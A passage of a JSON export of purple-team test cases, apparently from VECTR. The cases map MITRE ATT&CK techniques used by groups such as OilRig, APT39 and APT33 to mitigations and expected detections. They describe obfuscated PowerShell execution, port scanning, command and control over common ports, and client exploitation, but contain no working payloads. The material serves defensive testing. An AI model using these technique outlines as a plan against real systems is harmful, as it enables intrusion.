means.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619","relationship--a24299ed-9735-453c-bd13-66269b2d5d16","relationship--967c7069-6bb3-4f10-ba6b-5befdabe6c97","course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157","relationship--fa04ac7f-206f-42ad-b0c7-499e57bc99ce","course-of-action--8bd1ae32-a686-48f4-a6f8-470287f76152","relationship--4df90c69-8ac5-4f22-b0cf-dd4debb8e051","course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1119"},"blueTeam":{"successfulDetectionBehaviors":["Protect sensitive information with strong encryption.","Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [Input Capture](https://attack.mitre.org/techniques/T1056) and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [Brute Force](https://attack.mitre.org/techniques/T1110) techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--ad166886-0882-43ba-8486-aca3fd00c554","vectrId":"ad166886-0882-43ba-8486-aca3fd00c554","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"ad166886-0882-43ba-8486-aca3fd00c554","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Command-Line Interface","variant":"OilRig - Command-Line Interface","objective":"Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used the command-line interface for execution.Audit and/or block unnecessary command-line interpreters by using application whitelisting tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830","relationship--2c79282f-5e60-48b9-962a-d61c3d73b334","relationship--87fd0088-41da-47ac-bd69-a8ac151a0d39","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--b1ee5cba-d4e0-4af0-aa5c-5faacfdb0dbc","course-of-action--f28a20fd-d173-4603-807e-2cb3f51bdf04","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Gorzelany, A., Hall, J., Poggemeyer, L.. (2019, January 7). Windows Defender Application Control. Retrieved July 16, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/","Wikipedia. (2016, June 26). Command-line interface. Retrieved June 27, 2016. https://en.wikipedia.org/wiki/Command-line_interface"],"mitreId":"T1059"},"blueTeam":{"successfulDetectionBehaviors":["Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Audit and/or block command-line interpreters by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--b4ddc49c-9e18-483e-838a-dfcf82be47f4","vectrId":"b4ddc49c-9e18-483e-838a-dfcf82be47f4","name":"","offset":0,"createTime":1.534359582184E12,"updateTime":1.551994359887E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"b4ddc49c-9e18-483e-838a-dfcf82be47f4","icon":"icons/terminal-blue.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"Obfuscated Commands - PowerShell","objective":"Run an obfuscated PowerShell command to run a malicious command.","command":"invoke-obfuscation -> run command","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Medium","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["bc5080df-ad46-8c5a-9f23-12f61d2ec5e6"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":null,"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--b59010a2-74e0-4213-8e17-c1031c8e870d","vectrId":"b59010a2-74e0-4213-8e17-c1031c8e870d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"b59010a2-74e0-4213-8e17-c1031c8e870d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Network Service Scanning","variant":"APT39 - Network Service Scanning","objective":"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.","command":"[APT39](https://attack.mitre.org/groups/G0087) used a custom port scanner known as BLUETORCHEnsure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.\n---\nUse network intrusion detection/prevention systems to detect and prevent remote service scans.\n---\nEnsure proper network segmentation is followed to protect critical servers and devices.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88","relationship--02caaeff-7429-444f-bac2-498fe3a73cfd","relationship--371d43af-ef68-4471-9db9-f2d40d2baefc","course-of-action--d256cb63-b021-4b4a-bb6d-1b42eea179a3","relationship--32d482c4-2c0d-4688-a38b-d73b5b2962a3","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--651225d6-5454-4c44-8d62-776bd7ddaed2","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--80f94d40-0861-4403-b206-1c864a136788","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1046"},"blueTeam":{"successfulDetectionBehaviors":["Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--b95f6beb-8a88-4b03-b985-38b6c8325a3a","vectrId":"b95f6beb-8a88-4b03-b985-38b6c8325a3a","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"b95f6beb-8a88-4b03-b985-38b6c8325a3a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Commonly Used Port","variant":"APT33 - Commonly Used Port - Empire - FTP","objective":"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n\n---\n[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)","command":"[APT33](https://attack.mitre.org/groups/G0064) has used port 443 for command and control.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\nConfigure internal and external firewalls to block traffic using common ports that associate to network protocols that may be unnecessary for that particular network segment.\n---\n[Empire](https://attack.mitre.org/software/S0363) can conduct command and control over commonly used ports like 80 and 443.\n---\n[FTP](https://attack.mitre.org/software/S0095) operates over ports 21 and 20.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["001ff422-5ce9-9680-42ab-fe0247831238","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e","relationship--a7465f73-03b9-4cbb-91fc-4f7afb99553a","relationship--a34d1e30-dcf5-4743-93e5-e4834e980f0f","course-of-action--7c1796c7-9fc3-4c3e-9416-527295bf5d95","relationship--a1505946-76d9-4acb-8b1a-02c926915702","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--205b99bf-ce60-4bb5-8916-ac9d97ce4d05","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--3acdd039-5ea8-44e5-ba70-e00eece83432","tool--cf23bf4a-e003-4116-bbae-1ea6c558d565","relationship--05352dad-ecbb-477c-a05c-5eb3d67ae9ae","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Wikipedia. (2016, June 15). File Transfer Protocol. Retrieved July 20, 2016. https://en.wikipedia.org/wiki/File_Transfer_Protocol"],"mitreId":"T1043"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--bb8096ee-ae2e-4cd0-a695-7ac55c1eb143","vectrId":"bb8096ee-ae2e-4cd0-a695-7ac55c1eb143","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"bb8096ee-ae2e-4cd0-a695-7ac55c1eb143","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Exploitation for Client Execution","variant":"APT33 - Exploitation for Client Execution","objective":"Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","command":"[APT33](https://attack.mitre.org/groups/G0064) has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250).Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility.\n---\nBrowser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist.\n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. Risks of additional exploits and weaknesses in those systems may still exist.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63","relationship--e948752d-c4a1-4678-97e4-2bd11563115e","relationship--3d1c88d6-f390-4e05-ba1c-c6ea59f5fe22","course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3","relationship--d48a5068-7796-4c66-9ddf-eb6e8aaf6887","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--523f4d23-13b0-4ec3-a544-2d0614617e04","course-of-action--f2dcee22-c275-405e-87fd-48630a19dfba","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Cowan, C. (2017, March 23). Strengthening the Microsoft Edge Sandbox. Retrieved March 12, 2018. https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/","Goodin, D. (2017, March 17). Virtual machine escape fetches $105,000 at Pwn2Own hacking contest - updated. Retrieved March 12, 2018. https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/","Nunez, N. (2017, August 9). Moving Beyond EMET II – Windows Defender Exploit Guard. Retrieved March 12, 2018. https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Wikipedia. (2018, January 11). Control-flow integrity. Retrieved March 12, 2018. https://en.wikipedia.org/wiki/Control-flow_integrity"],"mitreId":"T1203"},"blueTeam":{"successfulDetectionBehaviors":["Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.","Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. (Citation: Windows Blogs Microsoft Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)\n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)\n\nSecurity applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--bb93c10d-080c-467b-b7c4-e2de00711f2e","vectrId":"bb93c10d-080c-467b-b7c4-e2de00711f2e","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"bb93c10d-080c-467b-b7c4-e2de00711f2e","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Valid Accounts","variant":"APT33 - Valid Accounts","objective":"Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. \n\nAccounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nDefault accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)","command":"[APT33](https://attack.mitre.org/groups/G0064) has used valid accounts for initial access and privilege escalation.Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs.\n---\nRoutinely audit source code, application configuration files, open repositories, and public cloud storage for insecure use and storage of credentials.\n---\nCloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting on cloud-based systems along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.\n---\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained.\n---\nEnsure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).\n---\nEnsure users and user groups have appropriate permissions for their roles through Identity and Access Management (IAM) controls. Configure user permissions, groups, and roles for access to cloud-based systems as well. Implement strict IAM controls to prevent access to systems except for the applications, users, and services that require access. Consider using temporary credentials that are only good for a certain period of time in cloud environments to reduce the effectiveness of compromised accounts.\n---\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured. Ensure that local administrator accounts have complex, unique passwords across all systems on the network.\n\nIn cloud environments, consider rotating access keys within a certain number of days for reducing the effectiveness of stolen 